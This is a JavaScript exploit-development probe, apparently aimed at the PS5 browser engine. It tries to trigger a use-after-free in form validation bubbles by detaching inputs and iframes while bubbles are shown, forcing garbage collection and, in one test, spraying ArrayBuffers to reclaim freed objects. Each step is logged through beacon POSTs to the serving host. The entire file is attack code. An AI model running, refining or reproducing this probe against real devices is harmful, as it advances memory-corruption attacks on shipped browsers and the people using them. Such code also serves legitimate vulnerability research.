// p512 — Validation bubble iframe detach UAF
//
// From Sony PS5 TestExpectations [Crash]:
//   validation-message-detached-iframe.html
//   validation-bubble-disappears-when-input-detached.html
//
// Attack: trigger form validation → validation bubble holds refs → detach element/iframe
// The validation bubble's backing object may reference freed document/element
//
// Beacon prefix: V512-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V512-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // Helper: GC pressure without gc() function
  function forceGC() {
    var junk = [];
    for (var i = 0; i < 500; i++) {
      junk.push(new ArrayBuffer(65536));
    }
    junk = null;
  }

  // ═══════════════════════════════════════════════════════════
  // T1: Input with required validation → detach input during bubble
  // ═══════════════════════════════════════════════════════════
  try {
    var form1 = document.createElement('form');
    var input1 = document.createElement('input');
    input1.type = 'text';
    input1.required = true;
    input1.name = 'test';
    form1.appendChild(input1);
    document.body.appendChild(form1);

    // Trigger validation by submitting empty required field
    input1.focus();
    var valid = form1.checkValidity();
    B('T1-VALID', 'valid=' + valid);

    // reportValidity shows the bubble
    var reported = form1.reportValidity();
    B('T1-REPORT', 'reported=' + reported);

    // Immediately detach the input while bubble is showing
    form1.removeChild(input1);
    B('T1-DETACH', 'input removed');

    // GC pressure to collect the detached input
    forceGC();
    B('T1-GC', 'pressure applied');

    // Try to interact with validation state
    try {
      var msg = input1.validationMessage;
      B('T1-MSG', 'msg=' + (msg ? msg.length : 'empty'));
    } catch(e) {
      B('T1-MSG-ERR', e.name);
    }

    document.body.removeChild(form1);
  } catch(e) {
    B('T1-ERR', e.name + ':' + e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // T2: Validation inside iframe → remove iframe
  // ═══════════════════════════════════════════════════════════
  try {
    var iframe = document.createElement('iframe');
    iframe.style.width = '300px';
    iframe.style.height = '200px';
    document.body.appendChild(iframe);

    var iframeDoc = iframe.contentDocument;
    iframeDoc.open();
    iframeDoc.write('<form id="f"><input type="text" required id="inp"><button type="submit">Go</button></form>');
    iframeDoc.close();

    var iframeForm = iframeDoc.getElementById('f');
    var iframeInput = iframeDoc.getElementById('inp');

    B('T2-IFRAME', 'form=' + !!iframeForm + ',input=' + !!iframeInput);

    // Trigger validation in iframe
    if (iframeForm) {
      iframeInput.focus();
      iframeForm.reportValidity();
      B('T2-REPORT', 'reported');

      // Remove iframe while validation bubble active
      document.body.removeChild(iframe);
      B('T2-REMOVE', 'iframe removed');

      forceGC();

      // Try to access iframe content after removal
      try {
        var check = iframeDoc.getElementById('inp');
        B('T2-ACCESS', 'input=' + !!check);
      } catch(e) {
        B('T2-ACCESS-ERR', e.name);
      }
    }
  } catch(e) {
    B('T2-ERR', e.name + ':' + e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // T3: Multiple validation bubbles + rapid detach
  // ═══════════════════════════════════════════════════════════
  try {
    var forms = [];
    for (var i = 0; i < 10; i++) {
      var f = document.createElement('form');
      var inp = document.createElement('input');
      inp.type = 'email';
      inp.required = true;
      inp.value = 'not-an-email';
      f.appendChild(inp);
      document.body.appendChild(f);
      forms.push({ form: f, input: inp });
    }

    // Trigger all validations
    for (var j = 0; j < forms.length; j++) {
      forms[j].input.focus();
      forms[j].form.reportValidity();
    }
    B('T3-VALIDATE', 'count=' + forms.length);

    // Rapidly detach all
    for (var k = 0; k < forms.length; k++) {
      forms[k].form.removeChild(forms[k].input);
      document.body.removeChild(forms[k].form);
    }
    B('T3-DETACH', 'all removed');

    forceGC();
    forceGC();

    // Spray to reclaim freed validation bubble objects
    var spray = [];
    for (var m = 0; m < 1000; m++) {
      spray.push(new ArrayBuffer(64));
    }
    B('T3-SPRAY', 'count=1000');

    // Check: any access to freed validation state?
    for (var n = 0; n < forms.length; n++) {
      try {
        var vmsg = forms[n].input.validationMessage;
      } catch(e) {
        B('T3-FREED-' + n, e.name);
        break;
      }
    }
    B('T3-DONE', 'survived');
  } catch(e) {
    B('T3-ERR', e.name + ':' + e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // T4: setCustomValidity + detach timing
  // ═══════════════════════════════════════════════════════════
  try {
    var form4 = document.createElement('form');
    var input4 = document.createElement('input');
    input4.type = 'text';
    form4.appendChild(input4);
    document.body.appendChild(form4);

    // Set custom validity to create bubble state
    input4.setCustomValidity('This field has an error');
    input4.focus();
    form4.reportValidity();
    B('T4-CUSTOM', 'validity set and reported');

    // Clear validity mid-bubble
    input4.setCustomValidity('');
    // Immediately remove form
    document.body.removeChild(form4);
    B('T4-CLEAR-REMOVE', 'cleared and removed');

    forceGC();
    B('T4-DONE', 'survived');
  } catch(e) {
    B('T4-ERR', e.name + ':' + e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // T5: Multiple iframes with validation → batch remove
  // ═══════════════════════════════════════════════════════════
  try {
    var iframes5 = [];
    for (var p = 0; p < 5; p++) {
      var ifr = document.createElement('iframe');
      ifr.style.cssText = 'width:200px;height:100px;';
      document.body.appendChild(ifr);
      var doc = ifr.contentDocument;
      doc.open();
      doc.write('<form><input type="number" required min="5" max="3" value="4"><button>X</button></form>');
      doc.close();
      iframes5.push(ifr);
    }
    B('T5-IFRAMES', 'created=' + iframes5.length);

    // Trigger validation in all iframes
    for (var q = 0; q < iframes5.length; q++) {
      var iDoc = iframes5[q].contentDocument;
      var iForm = iDoc.querySelector('form');
      var iInp = iDoc.querySelector('input');
      if (iForm && iInp) {
        iInp.focus();
        iForm.reportValidity();
      }
    }
    B('T5-VALIDATE', 'all reported');

    // Batch remove all iframes
    for (var r = 0; r < iframes5.length; r++) {
      document.body.removeChild(iframes5[r]);
    }
    B('T5-BATCH-REMOVE', 'all removed');

    forceGC();
    forceGC();
    B('T5-DONE', 'survived');
  } catch(e) {
    B('T5-ERR', e.name + ':' + e.message);
  }

  B('DONE', 'all tests complete');
})();
